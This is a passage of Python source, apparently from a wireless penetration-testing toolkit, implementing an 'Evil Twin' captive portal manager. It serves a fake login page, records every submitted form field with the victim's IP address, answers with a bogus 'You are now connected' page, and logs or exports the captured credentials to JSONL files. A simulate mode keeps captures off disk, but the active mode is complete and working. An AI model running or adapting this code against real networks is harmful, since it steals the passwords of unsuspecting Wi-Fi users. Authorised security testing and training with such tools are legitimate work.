class _CaptureEntry:
    __slots__ = ("data", "remote_addr", "timestamp")

    def __init__(self, remote_addr: str, data: dict[str, str]) -> None:
        self.timestamp = datetime.now(UTC).isoformat()
        self.remote_addr = remote_addr
        self.data = data


# ---------------------------------------------------------------------------
# HTTP handler
# ---------------------------------------------------------------------------

def _make_handler(template_html: str, manager: PortalManager) -> type:
    """Factory that builds a BaseHTTPRequestHandler bound to a specific template."""

    class _Handler(BaseHTTPRequestHandler):
        def log_message(self, fmt: str, *args: Any) -> None:
            logger.debug("[PortalServer] " + fmt, *args)

        def _send_html(self, code: int, body: str) -> None:
            encoded = body.encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(encoded)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(encoded)

        def do_GET(self) -> None:
            self._send_html(200, template_html)

        def do_POST(self) -> None:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8", errors="replace")
            fields: dict[str, str] = {}
            for part in body.split("&"):
                if "=" in part:
                    k, _, v = part.partition("=")
                    fields[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)

            remote = self.client_address[0]
            entry = _CaptureEntry(remote_addr=remote, data=fields)
            manager._record_capture(entry)

            self._send_html(200, _SUCCESS_PAGE)

    return _Handler


_SUCCESS_PAGE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>body{font-family:Arial;text-align:center;padding-top:80px;
  background:#1a1a1a;color:#fff}h1{color:#27ae60}</style>
</head><body>
<h1>&#10003; Connected</h1>
<p>You are now connected to the network.</p>
<p style="color:#888;font-size:13px">Enjoy your browsing session</p>
</body></html>"""


# ---------------------------------------------------------------------------
# Portal Manager
# ---------------------------------------------------------------------------

class PortalManager:
    """Evil Twin captive portal manager.

    Manages built-in portal templates and optionally serves them via Python's
    built-in HTTP server. Captured credentials are written to a log file.

    No Flask, FastAPI, or other external web framework is required.

    Args:
        log_dir: Directory where credential captures are written.
            Ignored in simulate mode.
        simulate: When True, the server starts but credential captures are
            only logged via the logging module, not written to disk.
        on_capture: Optional callback invoked with each captured credential dict.
    """

    def __init__(
        self,
        log_dir: str | Path | None = None,
        simulate: bool = True,
        on_capture: Callable[[dict[str, Any]], None] | None = None,
    ) -> None:
        self.simulate = simulate
        self.on_capture = on_capture
        self._captures: list[_CaptureEntry] = []
        self._lock = threading.Lock()
        self._server: HTTPServer | None = None
        self._thread: threading.Thread | None = None
        self._log_path: Path | None = None

        if not simulate and log_dir is not None:
            self._log_path = Path(log_dir).resolve()
            self._log_path.mkdir(parents=True, exist_ok=True)
            self._log_path = (
                self._log_path
                / f"captures_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl"
            )

    # ------------------------------------------------------------------
    # Template access
    # ------------------------------------------------------------------

    @staticmethod
    def list_templates() -> list[str]:
        """List all available template names.

        Returns:
            Sorted list of template identifiers.
        """
        return sorted(_TEMPLATES.keys())

    @staticmethod
    def get_template(name: str) -> str:
        """Return the HTML content for a named template.

        Args:
            name: Template identifier (see list_templates()).

        Returns:
            Self-contained HTML string.

        Raises:
            KeyError: If the template name is not found.
        """
        if name not in _TEMPLATES:
            available = ", ".join(sorted(_TEMPLATES.keys()))
            raise KeyError(f"Template '{name}' not found. Available: {available}")
        return _TEMPLATES[name]

    @staticmethod
    def add_template(name: str, html: str) -> None:
        """Register a custom template at runtime.

        Args:
            name: Unique template identifier.
            html: Self-contained HTML content.
        """
        if not name or not html:
            raise ValueError("name and html must be non-empty strings")
        _TEMPLATES[name] = html
        logger.info("[PortalManager] Custom template registered: %s", name)

    # ------------------------------------------------------------------
    # Credential capture
    # ------------------------------------------------------------------

    def _record_capture(self, entry: _CaptureEntry) -> None:
        with self._lock:
            self._captures.append(entry)

        payload = {
            "timestamp": entry.timestamp,
            "remote_addr": entry.remote_addr,
            "fields": entry.data,
        }

        logger.info("[PortalManager] CAPTURE from %s: %s", entry.remote_addr,
                    list(entry.data.keys()))

        if self.on_capture:
            from contextlib import suppress as _suppress
            with _suppress(Exception):
                self.on_capture(payload)

        if self.simulate:
            logger.info("[PortalManager] simulate=True - capture not written to disk")
            return

        if self._log_path:
            try:
                with open(str(self._log_path), "a", encoding="utf-8") as fh:
                    fh.write(json.dumps(payload) + "\n")
            except Exception as exc:
                logger.error("[PortalManager] Failed to write capture log: %s", exc)

    # ------------------------------------------------------------------
    # Server lifecycle
    # ------------------------------------------------------------------

    def start_server(self, template_name: str = "generic_wifi", port: int = 8080) -> bool:
        """Start the captive portal HTTP server.

        Args:
            template_name: Template to serve (see list_templates()).
            port: TCP port to listen on. Use 80 for real deployments
                (requires root/CAP_NET_BIND_SERVICE on Linux).

        Returns:
            True if the server started successfully.
        """
        if self._server is not None:
            logger.warning("[PortalManager] Server already running")
            return False

        try:
            html = self.get_template(template_name)
        except KeyError as exc:
            logger.error("[PortalManager] %s", exc)
            return False

        handler = _make_handler(html, self)

        try:
            self._server = HTTPServer(("0.0.0.0", port), handler)
            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
            self._thread.start()
            mode = "simulate" if self.simulate else "active"
            logger.info(
                "[PortalManager] Portal server started on port %d template='%s' mode=%s",
                port, template_name, mode,
            )
            return True
        except OSError as exc:
            logger.error("[PortalManager] Cannot bind port %d: %s", port, exc)
            self._server = None
            return False

    def stop_server(self) -> None:
        """Shut down the portal HTTP server."""
        if self._server:
            self._server.shutdown()
            self._server = None
            logger.info("[PortalManager] Portal server stopped")

    # ------------------------------------------------------------------
    # Credential access
    # ------------------------------------------------------------------

    @property
    def captures(self) -> list[dict[str, Any]]:
        """All captured credential submissions as a list of dicts."""
        with self._lock:
            return [
                {
                    "timestamp": e.timestamp,
                    "remote_addr": e.remote_addr,
                    "fields": e.data,
                }
                for e in self._captures
            ]

    def export_captures(self, path: str | Path) -> str:
        """Export captured credentials to a JSONL file.

        Args:
            path: Output file path.

        Returns:
            Absolute path of the written file.
        """
        out = Path(path).resolve()
        out.parent.mkdir(parents=True, exist_ok=True)

        if self.simulate:
            logger.info("[PortalManager] simulate=True - skipping export to %s", out)
            return str(out)

        with self._lock:
            entries = list(self._captures)

        with open(str(out), "w", encoding="utf-8") as fh:
            for e in entries:
                fh.write(
                    json.dumps({
                        "timestamp": e.timestamp,
                        "remote_addr": e.remote_addr,
                        "fields": e.data,
                    }) + "\n"
                )

        logger.info("[PortalManager] Exported %d captures to %s", len(entries), out)
        return str(out)

    def summary(self) -> dict[str, Any]:
        """Return a summary of portal activity."""
        with self._lock:
            total = len(self._captures)
            unique_ips = len({e.remote_addr for e in self._captures})
        return {
            "total_captures": total,
            "unique_source_ips": unique_ips,
            "server_running": self._server is not None,
            "simulate": self.simulate,
            "log_path": str(self._log_path) if self._log_path else None,
        }
